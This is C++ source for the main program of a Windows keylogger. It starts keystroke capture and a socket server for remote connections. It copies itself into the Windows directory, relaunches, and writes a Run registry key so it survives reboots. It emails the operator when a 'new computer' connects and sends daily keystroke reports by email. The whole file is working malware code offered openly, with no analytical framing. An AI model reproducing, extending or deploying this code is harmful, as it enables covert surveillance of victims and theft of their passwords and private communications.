#include "stdafx.h"

#include "modules/Keylogger.h"
#include "modules/SocketServer.h"
#include "helpers/StringHelper.h"
#include "helpers/ComputerInfoHelper.h"
#include "services/EmailService.h"
#include "helpers/Configuration.h"
#include "helpers/AppData.h"
#include <rpc.h>

extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }

#define SECONDS_IN_DAY 86400
#define CHECK_TIME_INTERVAL 1800

shared_ptr<Keylogger> logger;
shared_ptr<SocketServer> socketServer;
time_t prevEmailReportTime = 0;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam);
void socketThreadProc();
void mailerThreadProc();
bool addToStartup(std::wstring pszAppName, std::wstring pathToExe);
bool makeFirstLaunch();
void sendFirstEmail();
void initAppData();

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, INT iCmdShow) {

	Configuration::InitConfiguration();

	// Add console for debug
#ifdef _DEBUG
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	_setmode(_fileno(stdout), _O_U8TEXT);
	freopen("CONOUT$", "w", stderr);
#endif // _DBG
#ifndef _DEBUG
	auto isFirstLaunch = makeFirstLaunch();
	if (isFirstLaunch) {
		return 0;
	}
	// Only in first launch
	sendFirstEmail();
#endif // !DBG

	MSG msg;
	WNDCLASS wndClass;
	wndClass.lpfnWndProc = WndProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInstance;
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hbrBackground = NULL;
	wndClass.lpszMenuName = NULL;
	wndClass.lpszClassName = L"window";
	RegisterClass(&wndClass);

	logger = make_shared<Keylogger>();
	logger->start();

	socketServer = make_shared<SocketServer>();
	std::thread socketThread(socketThreadProc);
	std::thread mailerThread(mailerThreadProc);
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}

	socketThread.join();
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_QUIT:
	case WM_CLOSE:
		logger->stop();
		return 0;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
}

void socketThreadProc() {
	socketServer->start();
}

void mailerThreadProc() {
	while (true) {
		std::this_thread::sleep_for(std::chrono::seconds(CHECK_TIME_INTERVAL));
		time_t currentTime = time(nullptr);

		if (currentTime - prevEmailReportTime > SECONDS_IN_DAY) {
			// Send email in setted up interval of time
			std::cout << "hello" << std::endl;
			bool result = logger->sendEmailReport(L"", true, false);
			if (result) {
				prevEmailReportTime = currentTime;
				std::cout << "ok";
			} else {
				std::cout << "error";
			}
		}
	}
}

void initAppData() {
	// Generate UUID for computer
	UUID uuid;
	UuidCreate(&uuid);
	char *str;
	UuidToStringA(&uuid, (RPC_CSTR*)&str);

	AppData::getInstance().ComputerId = StringHelper::s2ws(str);
	AppData::getInstance().save();
}

bool addToStartup(std::wstring pszAppName, std::wstring pathToExe) {
	HKEY hkey = NULL;
	int result = 0;
	bool success = true;

	result = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hkey, NULL);

	success = (result == 0);

	if (success) {
		result = RegSetValueExW(hkey, pszAppName.c_str(), 0, REG_SZ,
			(BYTE*)pathToExe.c_str(), sizeof(wchar_t) * pathToExe.size());
		success = (result == 0);
	}

	if (hkey != NULL) {
		RegCloseKey(hkey);
		hkey = NULL;
	}

	return success;
}

bool makeFirstLaunch() {
	// Check if the first run on this computer
	const int buffSize = 1024;
	wchar_t buff[1024];
	GetModuleFileName(NULL, buff, buffSize);
	std::wstring path = std::wstring(buff);
	GetWindowsDirectory(buff, buffSize);
	std::wstring winDir = std::wstring(buff);
	if (StringHelper::toLower(path).find(StringHelper::toLower(winDir)) != 0) {
		// Copy self to windir
		std::wstring newPath = Configuration::ProgramPath;
		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
		if (result) {
			std::wcout << L"copied";
		} else {
			std::wcout << L"err";
		}

		initAppData();

		// Create new process of program in windir
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		CreateProcess(newPath.c_str(), NULL, NULL, NULL,
			NULL, NULL, NULL, NULL, &si, &pi);
		addToStartup(Configuration::ProgramFilename, newPath);
		return true;
	} else {
		return false;
	}
}

void sendFirstEmail() {
	auto emailService = make_shared<EmailService>();
	auto subject = L"Keylogger. New computer connected.";
	std::wstringstream bodyStream;
	bodyStream << ComputerInfoHelper::getInstance()->getHostName() << " connected" << std::endl;
	bodyStream << "To connect use this string:" << std::endl;
	bodyStream << "connect " << AppData::getInstance().ComputerId;
	emailService->sendEmail(subject, bodyStream.str(), L"", L"");
}
